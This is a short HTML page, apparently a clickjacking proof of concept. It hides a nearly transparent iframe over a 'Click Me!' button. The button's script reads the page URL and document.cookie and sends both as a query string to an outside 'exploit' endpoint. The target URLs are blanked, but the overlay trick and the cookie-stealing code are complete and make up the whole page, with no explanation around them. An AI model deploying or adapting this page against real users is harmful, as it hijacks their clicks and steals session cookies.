<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8">
    <title>Nice Web</title>
    <style>
      iframe {
        position:relative;
        width:500px;
        height: 700px;
        opacity: 0.1;
        z-index: 2;
      }
      div {
        position:absolute;
        top:300px;
        left:60px;
        z-index: 1;
      }
      #surprise {
        padding: 5px 16px;
        cursor: pointer;
      }
    </style>

  </head>

  <body>
    <div><button id=surprise onclick="myFunction()"  type="button">Click Me!</button></div>
    <iframe sandbox="allow-forms" src="https:// "></iframe>
  </body>

	<script>
		function myFunction() {
		 let cookie1=document.URL;
		 let cookie2=document.cookie;
		 var formData = new FormData();
		 formData.append('usersCookie', "bigDATA");
		 var xhr = new XMLHttpRequest();
		 getBody="https:// exploit?param="+String(cookie1)+"------"+String(cookie2);
		 xhr.open("GET",getBody, true);
		 xhr.send(null);
		 console.log('you clicked me');
		}
	</script>

</html>
